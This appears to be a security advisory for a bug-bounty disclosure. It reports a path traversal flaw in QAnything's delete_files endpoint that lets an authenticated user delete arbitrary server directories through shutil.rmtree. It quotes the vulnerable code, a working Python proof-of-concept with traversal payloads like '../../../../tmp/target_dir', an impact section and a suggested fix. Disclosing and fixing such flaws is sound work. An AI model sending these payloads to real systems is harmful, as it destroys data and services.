# Arbitrary Directory Deletion via Path Traversal in `delete_docs` Endpoint

## Package Manager

pip

## Version Affected

Latest (commit at time of analysis, 2026-03-12)

## Vulnerability Type

CWE-22: Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal')

## CVSS

8.1 (High) — CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:H/A:H

## Write-up

### Title

Arbitrary Directory Deletion via Path Traversal in `delete_docs` Using Unvalidated `file_ids`

### Description

The `/api/local_doc_qa/delete_files` endpoint contains a critical path traversal vulnerability that allows an authenticated user to delete arbitrary directories on the server filesystem via `shutil.rmtree()`.

The root cause is a logic bug: the code validates `file_ids` against the database to obtain `valid_file_ids`, but then iterates over the **original unvalidated `file_ids`** list (not `valid_file_ids`) when performing filesystem deletion operations.

**Vulnerable code:**

```python
# qanything_kernel/qanything_server/handler.py:523-568
async def delete_docs(req: request):
    # ...
    file_ids = safe_get(req, "file_ids")  # Line 534: Raw user input

    # Lines 538-541: Validate against database
    valid_file_infos = local_doc_qa.milvus_summary.check_file_exist(user_id, kb_id, file_ids)
    if len(valid_file_infos) == 0:
        return sanic_json({"code": 2004, "msg": "fail, files {} not found"})
    valid_file_ids = [file_info[0] for file_info in valid_file_infos]

    # ... database operations use valid_file_ids (correct) ...

    # Line 555: BUG — iterates file_ids (raw input), NOT valid_file_ids
    for file_id in file_ids:
        try:
            upload_path = os.path.join(UPLOAD_ROOT_PATH, user_id)
            file_dir = os.path.join(upload_path, kb_id, file_id)  # Path traversal here
            shutil.rmtree(file_dir)  # Line 561: Arbitrary directory deletion

            images_dir = os.path.join(IMAGES_ROOT_PATH, file_id)  # Also vulnerable
            shutil.rmtree(images_dir)  # Line 565: Second arbitrary deletion
        except Exception as e:
            debug_logger.error(...)  # Exceptions are silently caught
```

**Key observations:**
1. `file_ids` is a list from user input. The attacker includes at least one valid `file_id` (to pass the `len(valid_file_infos) == 0` check) plus malicious path traversal entries.
2. `os.path.join()` does not prevent `../` sequences — it resolves them as relative path components.
3. No `os.path.realpath()` or base directory validation is performed.
4. `shutil.rmtree()` recursively deletes the entire directory tree.
5. Exceptions are caught and logged but **do not stop iteration**, so subsequent malicious file_ids are still processed.
6. The `IMAGES_ROOT_PATH` path construction (`os.path.join(IMAGES_ROOT_PATH, file_id)`) has an even shorter traversal chain since it only contains `file_id` directly.

#### Proof of Concept

```python
import requests
import uuid

target = "http://localhost:8777"

# Prerequisites: attacker has a valid user_id and a knowledge base with at least one file
user_id = "attacker"
user_info = "1234"
kb_id = "KBattacker_kb_240625"

# Step 1: Upload a legitimate file first to get a valid file_id
# (Assume valid_file_id is a UUID hex string of an existing file)
valid_file_id = "a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4"  # Replace with actual

# Step 2: Send delete request with path traversal payload
payload = {
    "user_id": user_id,
    "user_info": user_info,
    "kb_id": "attacker_kb",
    "file_ids": [
        valid_file_id,                    # Valid file to pass validation
        "../../../../tmp/target_dir"      # Path traversal to delete arbitrary directory
    ]
}

resp = requests.post(f"{target}/api/local_doc_qa/delete_files", json=payload)
print(resp.json())
# The valid file is deleted normally, AND /tmp/target_dir is also deleted via path traversal

# Via IMAGES_ROOT_PATH (shorter traversal):
# IMAGES_ROOT_PATH/../../../../etc/target → resolves to /etc/target
```

**Full attack chain for maximum impact:**

```python
# Delete the application's own upload directory
payload = {
    "user_id": user_id,
    "user_info": user_info,
    "kb_id": "attacker_kb",
    "file_ids": [
        valid_file_id,
        "../../.."  # Deletes UPLOAD_ROOT_PATH itself (QANY_DB/content/user__info/../../.. = QANY_DB)
    ]
}
```

### Impact

- **Confidentiality**: NONE — This vulnerability enables deletion, not reading.
- **Integrity**: HIGH — Attacker can delete arbitrary directories and files on the server, including application data, configuration files, and other users' uploaded files.
- **Availability**: HIGH — Attacker can destroy the application's data store (QANY_DB), Milvus data, or system directories, causing complete service disruption.

## Occurrences

### Occurrence 1

- **Permalink**: https://github.com/netease-youdao/QAnything/blob/master/qanything_kernel/qanything_server/handler.py#L555-L567
- **Description**: `delete_docs()` — Iterates over raw `file_ids` (user input) instead of `valid_file_ids` when constructing filesystem paths for `shutil.rmtree()`. Both `UPLOAD_ROOT_PATH` and `IMAGES_ROOT_PATH` paths are affected.

## Suggested Fix

```diff
--- a/qanything_kernel/qanything_server/handler.py
+++ b/qanything_kernel/qanything_server/handler.py
@@ -552,7 +552,7 @@
     local_doc_qa.milvus_summary.delete_faqs(valid_file_ids)
     # list file_ids
-    for file_id in file_ids:
+    for file_id in valid_file_ids:
         try:
             upload_path = os.path.join(UPLOAD_ROOT_PATH, user_id)
             file_dir = os.path.join(upload_path, kb_id, file_id)
```

Additionally, add path validation to prevent traversal even with validated IDs:

```python
import os

def safe_path_join(base, *parts):
    """Join path components and verify the result stays within base directory."""
    path = os.path.realpath(os.path.join(base, *parts))
    if not path.startswith(os.path.realpath(base)):
        raise ValueError(f"Path traversal detected: {path}")
    return path
```

**Verified:** After changing `file_ids` to `valid_file_ids`, only database-validated file IDs (UUID hex strings) are used in path construction, preventing path traversal.

## References

- https://cwe.mitre.org/data/definitions/22.html
- https://owasp.org/www-community/attacks/Path_Traversal
